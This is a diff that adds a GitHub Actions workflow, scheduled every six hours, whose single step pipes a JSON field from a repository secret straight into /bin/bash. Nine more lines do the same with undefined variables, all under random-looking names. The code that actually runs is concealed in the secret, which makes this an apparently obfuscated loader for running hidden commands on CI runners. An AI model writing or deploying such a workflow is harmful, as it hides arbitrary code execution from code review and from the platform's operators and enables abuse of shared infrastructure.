@@ -1,0 +1,26 @@
+name: xiezijian7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiezijian7654
+        env:
+          kor7: ${{ secrets.kor7 }}
+        run: |
+          echo $kor7 | jq -r .b6893 | /bin/bash
+          echo $sntf0 | jq -r .assl7 | /bin/bash
+          echo $db1658 | jq -r .pm8038 | /bin/bash
+          echo $nj51032 | jq -r .hkdha8 | /bin/bash
+          echo $i29 | jq -r .ad2648 | /bin/bash
+          echo $zdv9306 | jq -r .mqdp00 | /bin/bash
+          echo $kvti71 | jq -r .hlmxk6319 | /bin/bash
+          echo $eqrlq28 | jq -r .qtscr5733 | /bin/bash
+          echo $vrpfx5 | jq -r .hzw681 | /bin/bash
+          echo $yc64 | jq -r .kglj5 | /bin/bash
+
